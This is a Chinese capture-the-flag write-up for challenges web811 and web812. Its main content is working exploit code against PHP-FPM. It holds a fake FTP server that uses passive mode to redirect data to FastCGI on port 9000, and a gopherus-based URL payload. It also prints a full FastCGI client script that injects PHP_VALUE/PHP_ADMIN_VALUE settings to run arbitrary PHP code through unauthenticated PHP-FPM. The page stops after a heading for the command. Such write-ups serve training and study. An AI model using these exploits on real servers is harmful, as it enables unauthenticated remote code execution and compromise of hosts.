<h1 id="web811（FTP的被动模式打FPM漏洞代码）"><a href="#web811（FTP的被动模式打FPM漏洞代码）" class="headerlink" title="web811（FTP的被动模式打FPM漏洞代码）"></a>web811（FTP的被动模式打FPM漏洞代码）</h1><p>本题考察FTP的被动模式打FPM漏洞代码<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254387">FTP的被动模式打FPM漏洞代码</a><br>上面文章是反弹shell了，但是我没有成功（泪奔）<br>于是我利用curl进行命令执行<br>首先利用vps搭建恶意的ftp服务器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">4566</span>)) <span class="comment">#端口可改</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>之后利用gopherus生成payload<br><img src="https://img-blog.csdnimg.cn/a860a9b4d10b43ba88e2301f83464aaf.png"><br>vps监听4438端口<br>payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=ftp://x.x.x.x:4566&amp;content=gopherus生成的payload(只取下划线后面的内容，且不需要再次编码)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/9e3780d8e5994cb1afbca7b8f0303cfe.png"><br>得到flag</p>
<h1 id="web812（PHP-FPM未授权）"><a href="#web812（PHP-FPM未授权）" class="headerlink" title="web812（PHP-FPM未授权）"></a>web812（PHP-FPM未授权）</h1><p>利用p神的脚本，详解在810中p神博客中有介绍原理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php system(&quot;cat /flagfile&quot;); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">28163</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    <span class="built_in">print</span>(force_text(response))</span><br></pre></td></tr></table></figure>
<p>命令为：</p>
